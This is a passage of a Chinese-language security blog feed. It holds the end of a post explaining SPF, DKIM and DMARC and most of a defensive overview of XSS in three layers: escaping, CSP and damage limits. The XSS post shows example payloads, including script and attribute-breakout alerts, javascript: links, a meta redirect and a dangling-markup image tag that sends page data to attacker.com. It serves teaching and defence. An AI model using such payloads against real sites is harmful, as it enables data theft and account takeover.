紀錄發佈出去讓收信方可以用來解密。在寄信時使用私鑰加密 header 的某些欄位與 body，並將產生的雜湊（hash）做為簽章附上，此簽章稱為 DKIM signature。要加密的欄位由 email server 指定，不過必須包含 <code>header.From</code>（否則寄件人的身份就沒有保障啦）。</p>\n<p>收信的 email server 進行驗證時，如同 SPF，MDA 會去查詢寄信網域的 DNS 紀錄，找到對應的公鑰後解密簽章內容來比對是否一致。</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/dkim.png\" alt=\"\"></p>\n<p>簽章如下圖所示，標籤中 <code>v</code> 為版本、<code>a</code> 代表加密方式。<code>d</code> <code>s</code> <code>q</code> 三者一起用來查詢公鑰，表示查詢域名為 <code>&lt;selector&gt;._domainkey.&lt;domain&gt;</code>（圖中就是 <code>brisbane._domainkey.example.net</code>）的 DNS TXT 紀錄。<code>h</code> 代表指定的header 欄位，加密後的結果會放在 <code>b</code>，而 <code>bh</code>（body hash）則是 body 本身經過雜湊後的結果。</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/dkim-signature.png\" alt=\"\"></p>\n<p>如果今天 <a href=\"http://gmail.com\">gmail.com</a> 設置了 DKIM 紀錄，那爺爺的 email server 在驗證時就會發現表弟竄改完的信件跟數位簽章解密的結果不符，因此判斷為驗證失敗，爺爺再度逃脫表弟的暗算。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89\">#</a> 情境三</h3>\n<p>表弟拿不到零用錢，很是挫敗。於是他絞盡腦汁終於想到：既然我不能仿冒 <a href=\"http://gmail.com\">gmail.com</a> 也不能攔截真的信件，那我就自己架一個 email server、申請一個合法網域 <a href=\"http://cousin.com\">cousin.com</a> ，然後寄一封信紙（<code>header.From</code>）上寫 <a href=\"mailto:goodboy@gmail.com\">goodboy@gmail.com</a> 的信給爺爺就好啦！雖然信封袋（<code>smtp.MailFrom</code>）上寫的是 <a href=\"http://cousin.com\">cousin.com</a>，但反正爺爺在 outlook 裡看到的也只有 <code>header.From</code>，他哪知道不是真的從 <a href=\"http://gmail.com\">gmail.com</a> 來的。而且，不管是 SPF 還是 DKIM 驗證的都是 <code>smtp.MailFrom</code> 的網域，我本來就是 <a href=\"http://cousin.com\">cousin.com</a> 又沒造假，休想擋我財路！</p>\n<p>哎呀，表弟想的真有道理。</p>\n<p>不過好在 2015 年 3 月時 RFC 7489 出現，提出了一個可以保護爺爺的方法，名為 <strong>Domain-based Message Authentication, Reporting and Conformance（DMARC）</strong></p>\n<blockquote>\n<p>DMARC 結合了 SPF 與 DKIM，形成三人聯防，缺一不可，同時強化信紙與信封袋的一致性。</p>\n</blockquote>\n<p>DMARC 主要有兩個功能，其一是指示了當 SPF 與 DKIM 驗證失敗時該採取的行為，稱為 policy；第二則是確保信紙與信封袋上標示的寄件人來自同一個網域（也就是比對<code>header.From</code>跟<code>smtp.MailFrom</code>），稱為 alignment。</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/dmarc.png\" alt=\"\"></p>\n<p>以上面這個 DMARC 紀錄為例，必要的標籤為 <code>p</code>（policy），可能的值有：</p>\n<ul>\n<li><code>reject</code>：最嚴格的設定，表示 SPF 與 DKIM 驗證失敗的信一律回絕或直接捨棄</li>\n<li><code>quarantine</code>：隔離，實際處理方法因 email server 而異，可能是放在 email server 上的隔離區域等待視察（例如微軟的 email server 有 quarantine center），或是被歸類到垃圾郵件中並加註警戒標籤（例如 gmail 的處理方式）。</li>\n<li><code>none</code>：最寬鬆的設定，表示不做特別處理，僅是觀察（monitor），實際處理方法因 email server 而異，有可能進入一般信箱也可能歸類到垃圾郵件。</li>\n</ul>\n<p>而定義 alignment 的標籤為 <code>aspf</code> 與 <code>adkim</code>，分別對應 SPF 與 DKIM。以 SPF 來說是比對 <code>header.From</code> 的網域與 <code>smtp.MailFrom</code> 的網域；以 DKIM 來說是比對 <code>header.From</code> 與 DKIM signature 中 <code>d</code> 標籤的網域（例如前面圖中藍色字體的 <a href=\"http://example.net\">example.net</a>）。</p>\n<p>可能的值有：</p>\n<ul>\n<li><code>s</code>（strict）：嚴格檢查，比對的兩個網域必須完全</li>\n<li><code>r</code>（relaxed）：寬鬆檢查，比對的兩個網域只要 base domain 相同即可，亦即可為主網域與子網域的關係</li>\n</ul>\n<p>DMARC 甚至很貼心的附贈回報功能，你可以在 DMARC 紀錄指定信箱，則收信方的 email server 會每天整理並寄送一份報告到這個信箱，告訴你昨天信件驗證的狀況，包含驗證失敗的信的 trace 資訊與驗證結果。</p>\n<p>你也可以在每一封信的原始資訊中看見驗證結果：</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/dmarc-result.png\" alt=\"\"></p>\n<p>如果今天 <a href=\"http://gmail.com\">gmail.com</a> 設置了 SPF、DKIM、DMARC 紀錄，那爺爺的 email server 在驗證時就會發現雖然表弟的 SPF、DKIM 驗證通過了，但是<code>header.From</code>寫的 <a href=\"http://gmail.com\">gmail.com</a> 跟<code>smtp.MailFrom</code>還有 DKIM signature 中 <code>d</code> 標籤寫的 <a href=\"http://cousin.com\">cousin.com</a> 對不起來，因此判斷為驗證失敗，爺爺因此又平安度過了一天！</p>\n<hr>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>讀到這裡，大家是否更加了解對 email security 有哪些威脅與防護機制了呢？我們從一封郵件的旅程介紹傳輸過程中的各種角色與職責，也透過三個情境讓大家認識 SPF、DKIM、DMARC 這些防護的用意與效果。有了這三劍客，我們就不用擔心信件被篡改、仿造、或是從未經授權的地方寄出了。近來 email security 意識抬頭，DMARC 也名列 Gartner 十大資安主題排行榜喔！</p>\n<p>不過其實這些機制還有很多不足的地方，例如：中繼 email server 是可以冒充的嗎？是誰控制的？如果 <code>smtp.MailFrom</code> 跟 <code>header.From</code> 不同的時候（例如合理使用 forwarding 功能）不就完蛋了嗎？在沒有這些機制以前是如何防治釣魚的；有了三劍客以後還有哪些機制可以補強呢？</p>\n<p>這些耐人尋味的問題，我們留待之後更深入探討。下一篇，我們先來看看三劍客到底如何設置，以及有哪些容易出錯的小地方～</p>\n<p>附帶一提，為了讓使用者可以更輕易的從寄信人的頭貼辨識出是不是『正身』，有另一個叫做 BIMI 的機制是用來驗證頭貼的哦！不過目前 BIMI 還不是很普及，有興趣的朋友可以再去了解。</p>\n<h3 id=\"references%3A\"><a class=\"direct-link\" href=\"#references%3A\">#</a> References:</h3>\n<ol>\n<li><a href=\"https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users\">Internet Mail Architecture</a></li>\n<li><a href=\"https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc\">Mail terminology</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7208\">SPF RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6376#section-5\">DKIM RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7489\">DMARC RFC</a></li>\n<li><a href=\"https://dmarc.org/\">DMARC.org</a></li>\n<li><a href=\"https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/\">Gartner</a></li>\n</ol>\n",
      "date_published": "2021-07-02T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/",
      "title": "淺談 XSS 攻擊與防禦的各個環節",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<p>談到 XSS（Cross-site scripting），許多人可能都只想到「就是網站上被攻擊者植入程式碼」，但若是仔細去想的話，會發現這之中其實還有很多環節都可以再深入探討。</p>\n<!-- summary -->\n<p>而我所謂的這些「環節」，也可以理解成不同的「關卡」。</p>\n<p>舉例來說，第一關當然就是盡可能防止自己的網站被 XSS 攻擊，不要讓攻擊者在網站中能夠植入程式碼。而「讓攻擊者在網站中植入程式碼」這件事，又可以往下再細分成不同地方的植入，例如說 HTML 的植入，或者是 HTML 元素屬性中的植入，又或是 JavaScript 程式碼中的植入，這些都有著不同的攻擊以及防禦方式。</p>\n<p>而除了防止被植入程式碼以外，防守方應該還要進一步去想：「那如果真的不幸被植入程式碼了，可以怎麼辦？」</p>\n<p>這就是第二個關卡。雖然說第一關我們已經盡可能做好準備了，但難保不會有漏洞產生，因此守好第一關是不夠的，也要對第二關進行防守。</p>\n<p>假設今天攻擊者真的找到一個地方植入程式碼，那我們是不是可以想辦法阻止它執行？這就是 CSP（Content Security Policy）出場的時候了，藉由設定一些規則讓不合法的程式碼無法執行。例如說可以讓 inline 的 JavaScript 無法執行，那 <code>&lt;img src=x onerror=alert(1)&gt;</code> 就會變得無效。</p>\n<p>若是攻擊者真的很厲害，連 CSP 的規則都繞過了呢？這時就進入到第三關了，第三關的假設是攻擊者已經能夠在網站上執行任意程式碼。</p>\n<p>這時候還可以防守什麼呢？那就是試圖把損害控制到最低。</p>\n<p>以 Medium 這種部落格的平台來說，若是可以利用 XSS 把別人的帳號奪走（account takevoer），就是個嚴重的漏洞；或是因為 Medium 有付費牆的功能，因此若是能透過 XSS 把錢轉到攻擊者的帳號，也會是一個很嚴重的問題。</p>\n<p>而我們要在「網站已經被 XSS」的前提下，試圖去防禦這些攻擊。</p>\n<p>接著，就讓我們來看看不同的關卡有哪些不同的防禦方法。</p>\n<h2 id=\"%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%94%BB%E6%93%8A%E8%80%85%E5%9C%A8%E7%B6%B2%E7%AB%99%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BC%8F%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%94%BB%E6%93%8A%E8%80%85%E5%9C%A8%E7%B6%B2%E7%AB%99%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BC%8F%E7%A2%BC\">#</a> 第一關：阻止攻擊者在網站植入程式碼</h2>\n<p>要防止 XSS 的第一步，當然就是阻止攻擊者在網站上植入他們想要的東西，核心精神可以濃縮成一句：</p>\n<blockquote>\n<p>永遠不要相信使用者的輸入</p>\n</blockquote>\n<p>只要是有輸入的地方，都應該去做驗證。在輸出不被信任的資料時應該要做跳脫（escape）。</p>\n<p>舉例來說，今天有個地方可以讓使用者設定自己的暱稱，因為使用者可以自己輸入東西，所以在輸出這邊的資料時就要特別注意。</p>\n<p>如果在 render 時就是直接把使用者的輸入原封不動 render 出來，那若是使用者輸入的暱稱是：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，任何人瀏覽這一頁的時候就會看到畫面跳出一個 alert，因為暱稱輸入的東西被當作程式碼執行了。</p>\n<p>這種攻擊可以成立的主因就是使用者的輸入變成了程式碼的一部分，導致未預期的行為。</p>\n<p>要防止這種行為，就是在 render 的時候要做跳脫。例如說要先把 <code>&lt;</code> 轉成 <code>&amp;lt</code>，這樣在畫面上看到的依然是 <code>&lt;</code>，但是對 parser 來說那並不是標籤開始的符號，而是文字的 <code>&lt;</code>，就不會被當作 HTML 標籤來解析。</p>\n<p>如此一來，就能防止攻擊者植入程式碼。</p>\n<p>不過，這還只是對跳脫的粗淺理解而已，真正需要注意的是在不同的情境之下，可能會需要用不同的方式跳脫，就如同這兩篇講的一樣：</p>\n<ol>\n<li><a href=\"https://www.ptt.cc/bbs/Soft_Job/M.1582437563.A.6F7.html\">Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(1)</a></li>\n<li><a href=\"https://www.ptt.cc/bbs/Soft_Job/M.1582441681.A.A7B.html\">Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(2)</a></li>\n</ol>\n<p>假設你只有想到說要對標籤做跳脫，把 <code>&lt;&gt;</code> 這兩個符號都做了 escape，那確實沒有辦法直接插入標籤。可是，如果 render 暱稱的地方是這樣呢？</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>&lt;?= avatar_url ?><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>&lt;?= nickname ?><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span><span class=\"token prolog\">&lt;?= nickname ?></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>除了在 div 裡面輸出暱稱之外，也會在 img 的 alt 標籤裡把暱稱 render 出來。這時候如果只跳脫了 <code>&lt;&gt;</code> 是不夠的，因為如果我讓 nickname 變成 <code>&quot; onload=&quot;alert(1)</code> 的話，結合起來就會變成：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>avatar_url<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onload</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\" onload=\"alert(1)<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>攻擊者可以利用 <code>&quot;</code> 關閉前面的屬性，然後創出一個新的屬性 <code>onload</code>，達成 HTML 標籤屬性利用的 XSS。</p>\n<p>所以常見的特殊符號像是 <code>&quot;'&lt;&gt;</code> 都要去做 escape，才能確保在不同地方時都有防禦效果。而這點其實許多程式語言或是 framework 都有做到了，例如說 PHP 的 htmlspecialchars：</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629700-8743df00-d0f1-11eb-937b-910934140e96.png\" alt=\"xss1\"></p>\n<p>那這樣就打完收工了嗎？還沒。</p>\n<p>因為，在連結裡的內容又是另外一回事了，例如說：<code>&lt;a href=&quot;&lt;?= link ?&gt;&quot;&gt;my website&lt;/a&gt;</code></p>\n<p>有一種東西叫做 JavaScript pseudo-protocol，可以利用 <code>javascript:</code> 來執行 JS 程式碼，像是這樣：<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;my website&lt;/a&gt;</code>，在使用者點擊這個連結時，就會跳出 alert。</p>\n<p>而 <code>javascript:alert(1)</code> 這幾個字，完全沒有包含我們上面需要 escape 的特殊字元 <code>&quot;'&lt;&gt;&amp;</code>，所以在這個狀況我們需要有不同的 escape 方法，或者是直接檢查內容，指定開頭必須要是 <code>http://</code> 或是 <code>http://</code> 之類的。</p>\n<p>這就是我剛剛講的，在不同地方，需要用不同的方式來進行跳脫及防禦。如果都是用同一種的話，有些地方就會失效。</p>\n<p>有些人看到這邊會想說：「阿～不用擔心啦！我用的前端框架都幫我做好了，預設都會 escape 啦！不會被 XSS」</p>\n<p>這個宣稱大部分是對的，現在確實很多前端的框架會處理這件事，但要特別注意我剛剛提的 href 的例子，因為 <code>javascript:alert(1)</code> 這幾個字元都不是特殊字元，所以跳脫完還是長一樣，依然會有這樣的漏洞。</p>\n<p>React 在 v16.9 的時候就針對這個 case 新增了警告：<a href=\"https://reactjs.org/blog/2019/08/08/react-v16.9.0.html#deprecating-javascript-urls\">Deprecating javascript: URLs</a>，並且在之後的 release 中會自動阻擋這個行為。不過根據測試的結果，目前的版本 v17.0.2 只會警告而已，還不會阻擋。</p>\n<p>這邊有一些相關的討論：<a href=\"https://github.com/facebook/react/issues/16592\">React@16.9 block javascript:void(0); #16592</a> 與 <a href=\"https://github.com/facebook/react/issues/16382\">False-positive security precaution warning (javascript: URLs) #16382</a>，想看程式碼的話在這邊：<a href=\"https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/shared/sanitizeURL.js\">react/packages/react-dom/src/shared/sanitizeURL.js </a>。</p>\n<p>除了看使用情境跳脫不是件容易的事情以外，意識到有哪些地方是使用者可以自己輸入的也沒有想像中簡單。</p>\n<p>因為除了資料庫或者是 API 是你的資料來源之外，URL 可能也是。有些程式碼會直接把網址列上的某個 query string 放到 JS 裡，之後直接把這個變數輸出到畫面上，這就是無意間信任了不該信任的資料。</p>\n<p>舉例來說，搜尋頁面的網址可能長這樣：<code>https://example.com/search?q=hello</code>，而在程式中是這樣寫的：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> q <span class=\"token operator\">=</span> <span class=\"token string\">'hello'</span> <span class=\"token comment\">// 從網址列拿下來的參數</span><br>document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.search'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> q</code></pre>\n<p>這時如果你把 q 換成 HTML：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，在沒做跳脫就輸出的狀況下，就會有 XSS 漏洞的產生。</p>\n<p>最後呢，有些網站會允許內容有部分的 HTML，最常見的就是部落格，因為部落格要有樣式嘛，除非是自訂資料格式，不然有些網站都直接把內文存成 HTML，然後用 <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a> 或是 <a href=\"https://github.com/leizongmin/js-xss\">js-xss</a> 之類的套件去過濾，把不合法的標籤或是屬性過濾掉。</p>\n<p>雖然說使用這些 library 相對安全，但需要注意的是版本要時常更新，因為這類型的套件也可能會有漏洞的產生（<a href=\"https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/\">Mutation XSS via namespace confusion – DOMPurify &lt; 2.0.17 bypass</a>）。另外也需要注意使用時的設定，設定錯誤的話也有可能造成問題，實際案例可以參考：<a href=\"https://medium.com/cymetrics/prevent-xss-might-be-harder-than-you-thought-ce8c422540b\">防止 XSS 可能比想像中困難</a>。</p>\n<p>總結一下，想要做好第一關的 XSS 防禦，需要注意的事情有：</p>\n<ol>\n<li>意識到哪邊是使用者可以自己輸入資料的地方</li>\n<li>針對不同情境去做 XSS 的防禦</li>\n</ol>\n<p>也可以考慮導入現成的 <a href=\"https://www.cloudflare.com/zh-tw/learning/ddos/glossary/web-application-firewall-waf/\">WAF</a>（Web Application Firewall），直接幫你把一些看起來很可疑的 payload 擋住。不過 WAF 也不是百分百有效，只是多一道防線而已。<br>\n或是也可以關心一下這個比較新的東西：<a href=\"https://web.dev/trusted-types/\">Trusted Types</a>。</p>\n<h2 id=\"%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C\">#</a> 第二關：阻止惡意程式碼被執行</h2>\n<p>假設第一關被突破了，攻擊者可以在網站上插入任意程式碼，這時候要考慮的事情就是如何阻止程式碼被執行。</p>\n<p>這一關的重點是 CSP，Content Security Policy。</p>\n<p>CSP 是一系列的規則，用來跟瀏覽器講說哪些來源的資源可以被載入，哪些不行，可以利用 response header 或是 <code>&lt;meta&gt;</code> tag 來指定頁面的 CSP 規則。</p>\n<p>舉例來說，如果我很確定網站上的 JS 都來自於同一個 origin，那我的 CSP 就可以這樣寫：</p>\n<pre class=\"language-js\"><code class=\"language-js\">Content<span class=\"token operator\">-</span>Security<span class=\"token operator\">-</span>Policy<span class=\"token operator\">:</span> <span class=\"token keyword\">default</span><span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span> script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span></code></pre>\n<p><code>self</code> 代表的是 same origin 的意思。這樣寫的話，如果你試著載入不是當前 origin 的 JS，或者是直接在頁面上用 inline 的方式執行 script，都會看到瀏覽器報錯：</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629705-8f038380-d0f1-11eb-851d-04ed70c19317.png\" alt=\"xss2\"></p>\n<p>CSP 可以制定許多不同資源的規則，需要更詳細的解釋可以看這邊：<a href=\"https://content-security-policy.com/\">Content Security Policy Reference</a>。想找到比較完整的 CSP，去看一些大公司的實作是最快的，接著我們直接來看一下 GitHub 的 CSP 長什麼樣子（為了方便閱讀，有重新排版過）：</p>\n<pre class=\"language-csp\"><code class=\"language-csp\"><span class=\"token directive keyword\">default-src</span> <span class=\"token safe selector\">'none'</span><br><br><span class=\"token directive keyword\">base-uri</span> <span class=\"token safe selector\">'self'</span>;<br><br><span class=\"token directive keyword\">block-all-mixed-content</span>;<br><br><span class=\"token directive keyword\">connect-src</span> <span class=\"token safe selector\">'self'</span> uploads.github.com www.githubstatus.com collector.githubapp.com<br>api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com<br>github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com<br>html-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com/v1/events wss://alive.github.com<br><span class=\"token unsafe function\">*</span>.actions.githubusercontent.com wss://<span class=\"token unsafe function\">*</span>.actions.githubusercontent.com online.visualstudio.com/api/v1/locations<br>insights.github.com;<br><br><span class=\"token directive keyword\">font-src</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">form-action</span> <span class=\"token safe selector\">'self'</span> github.com gist.github.com;<br><br><span class=\"token directive keyword\">frame-ancestors</span> <span class=\"token safe selector\">'none'</span>;<br><br><span class=\"token directive keyword\">frame-src</span> render.githubusercontent.com;<br><br><span class=\"token directive keyword\">img-src</span> <span class=\"token safe selector\">'self'</span> data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com<br>secured-user-images.githubusercontent.com/ <span class=\"token unsafe function\">*</span>.githubusercontent.com;<br><br><span class=\"token directive keyword\">manifest-src</span> <span class=\"token safe selector\">'self'</span>;<br><br><span class=\"token directive keyword\">media-src</span> github.com user-images.githubusercontent.com/;<br><br><span class=\"token directive keyword\">script-src</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">style-src</span> <span class=\"token unsafe function\">'unsafe-inline'</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">worker-src</span> github.com/socket-worker-3f088aa2.js gist.github.com/socket-worker-3f088aa2.js</code></pre>\n<p>想要檢查 CSP 規則有沒有明顯漏洞的話，可以到 <a href=\"https://csp-evaluator.withgoogle.com/\">CSP Evaluator</a>，而 GitHub 的 CSP 設置得很嚴謹，幾乎每一種資源都有設定。</p>\n<p>這邊可以看到 script-src 的值只有 <code>github.githubassets.com</code>。因為沒有 <code>unsafe-inline</code> 的關係，所以 inline script 無法執行，而引入 script 的話也只能從 <code>github.githubassets.com</code> 這個來源引入，幾乎封死了執行 script 的路。</p>\n<p>而許多網站的 CSP 其實並不會設置得這麼嚴格，就有比較高的機率會被繞過，例如說 <a href=\"https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html\">A Wormable XSS on HackMD!</a> 直接用 cloudflare CDN 上的 AngularJS + CSTI 繞過；<a href=\"https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md\">HackMD Stored XSS &amp; Bypass CSP with Google Tag Manager</a> 則是用 Google Tag Manager 來繞。</p>\n<p>另外，在某些情境之下就算乍看被封死，依然可以透過現有的 script 來幫你繞過，詳細資訊可以參考這個很經典的演講：<a href=\"https://github.com/google/security-research-pocs/tree/master/script-gadgets\">Breaking XSS mitigations via Script gadgets</a>。</p>\n<p>那如果真的沒辦法執行 script，還有什麼可以做的呢？</p>\n<p>就算只是插入 HTML，也還是可以做事的。</p>\n<p>例如說可以利用插入 HTML meta tag 來造成重新導向，把使用者導到惡意網站去，像這樣：<code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;https://example.com&quot;&gt;</code>。</p>\n<p>或者是插入 <code>&lt;img src=&quot;https://attacker.com?q=</code>（注意這邊 src 的雙引號只有開頭），讓整段 HTML 變成：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://attacker.com?q=<br>&lt;div>user info&lt;/div><br>&lt;div>sensitive data&lt;/div><br>&lt;div class=<span class=\"token punctuation\">\"</span></span><span class=\"token attr-name\">test\"</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>藉由 src 沒有閉合的 <code>&quot;</code>，就可以拿到下一個 <code>&quot;</code> 為止的 HTML 內容，把這些當作 query string 的一部分傳到 server，而這中間可能就會有一些敏感資料的存在。所以 <code>img-src</code> 的 CSP 規則也是有用處的，可以防止這類型的攻擊。</p>\n<p>或也可以結合 <a href=\"https://blog.huli.tw/2021/01/23/dom-clobbering/\">DOM Clobbering</a>，看看有沒有什麼地方可以攻擊。</p>\n<p>因此，就算不能執行 script，依然有其他攻擊手法可以用。</p>\n<p>GitHub 在 2017 年時有寫過一篇 <a href=\"https://github.blog/2017-01-19-githubs-post-csp-journey/\">GitHub’s post-CSP journey</a>，特別講了他們的 CSP 是怎麼設計的，是為了防範哪些已知的攻擊，寫得非常不錯。他們甚至還有一個 bug bounty 是 <a href=\"https://bounty.github.com/targets/csp.html\">GitHub CSP</a>，就算沒有找到 XSS 也沒有關係，只要提出能繞過 CSP 的手法就可以拿到獎金。</p>\n<h2 id=\"%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E9%99%8D%E4%BD%8E-xss-%E6%94%BB%E6%93%8A%E4%B9%8B%E6%90%8D%E5%AE%B3\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E9%99%8D%E4%BD%8E-xss-%E6%94%BB%E6%93%8A%E4%B9%8B%E6%90%8D%E5%AE%B3\">#</a> 第三關：降低 XSS 攻擊之損害</h2>\n<p>如果街亭跟前兩關都沒守住，XSS 勢在必行的話，接下來要思考的就是該如何降低 XSS 攻擊之損害。</p>\n<p>這邊我覺得有兩個面向可以去思考：</p>\n<ol>\n<li>避免攻擊者用受害者的身份登入</li>\n<li>避免攻擊者透過 XSS 進行比較重要的操作</li>\n</ol>\n<p>先來談第一種，有一種最常見的攻擊方式就是偷 cookie，把 document.cookie 偷走之後，若是使用者驗證身份的 token 在裡面，就可以直接用受害者的身份登入。因此這種驗證用的 cookie，請記得設定 <code>HttpOnly</code>，就能確保前端無法直接用 document.cookie 就取得 cookie。</p>\n<p>如果因為各種原因沒辦法保護使用者的 token，那就可以再設下其他關卡，例如說最常見的就是地點的檢查。假設一個使用者一直以來都在台灣，可是卻突然在烏克蘭發了一個 request，這時就可以先把這個操作擋住，並寄信告知使用者有可疑操作，麻煩他確認是否為本人。或也可以檢查使用者的瀏覽器是否一致，不一致的話一樣要先經過確認，加上另一道手續來保障使用者的安全。</p>\n<p>再來談第二種，就算 cookie 沒被偷走，因為攻擊者已經能執行任意程式碼了，所以直接打後端 API 還是做得到的，而且 cookie 會自動帶上。因此只要是使用者可以做的操作，攻擊者基本上都做得到。</p>\n<p>以部落格平台來說的話，發文、編輯文章或是刪文都是做得到的，攻擊者就只要直接利用 XSS 去打 API 就行了。</p>\n<p>這時候對於一些比較重要的操作，就應該設置第二道關卡，例如說更改密碼需要輸入原密碼，那這樣因為攻擊者不知道原密碼是什麼，打 API 也沒有用。或者是要轉帳的時候需要用手機接收驗證碼，沒有手機的話就無法執行操作。</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629715-96c32800-d0f1-11eb-971b-10f405ebd010.png\" alt=\"xss3\"></p>\n<p>其實說白話一點就是 2FA（Two-factor authentication）啦。對於這些重要操作，除了登入之外還要設下第二種可以確認是本人的機制，這樣就算被打出 XSS，攻擊者也無法執行這些操作，可以讓損害降低。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>資安的世界既廣又深，這篇提到的都只是大方向的概觀而已。若是再深入下去，每個環節都可以再變成多個獨立的主題，而且也可以結合其他的攻擊，例如說：</p>\n<ol>\n<li>自訂的 XSS 